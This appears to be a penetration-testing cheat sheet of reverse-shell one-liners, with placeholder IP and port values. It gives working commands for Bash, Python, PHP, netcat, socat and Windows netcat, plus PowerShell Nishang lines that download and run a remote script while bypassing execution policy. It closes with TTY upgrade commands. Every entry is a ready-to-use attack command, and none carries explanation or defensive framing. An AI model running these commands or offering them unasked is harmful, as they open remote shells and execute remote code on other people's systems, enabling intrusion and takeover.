# Different Shells
## Bash
bash -i >& /dev/tcp/<IP Address>/<Port> 0>&1
## Python
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("<IP Address>",<Port>));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
## PHP
php -r '$sock=fsockopen("<IP Address>",<Port>);exec("/bin/sh -i <&3 >&3 2>&3");'
## NC 1
nc -e /bin/sh <IP Address> <Port>
## NC 2
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc <IP Address> <Port> >/tmp/f
## NC Windows
nc  <IP Address> <Port> -e cmd.exe
## Powershell - Nishang 1
powershell iex (New-Object Net.WebClient).DownloadString('http://<IP Address>/Invoke-PowerShellTcp.ps1');Invoke-PowerShellTcp -Reverse -<IP Address> -Port <Port>
## Powershell - Nishang 2
powershell.exe -exec Bypass -C "iex (New-Object Net.WebClient).DownloadString('http://<IP Address>/Invoke-PowerShellTcp.ps1');Invoke-PowerShellTcp -Reverse -<IP Address> -Port <Port>"
## SOCAT 1
sudo socat file:`tty`,raw,echo=0 tcp-listen:<Port>
## SOCAT 2
socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:<IP Address>:<Port>
# TTY Upgrades
## PYTHON
python -c 'import pty;pty.spawn("/bin/bash")'
python3 -c 'import pty;pty.spawn("/bin/bash")'
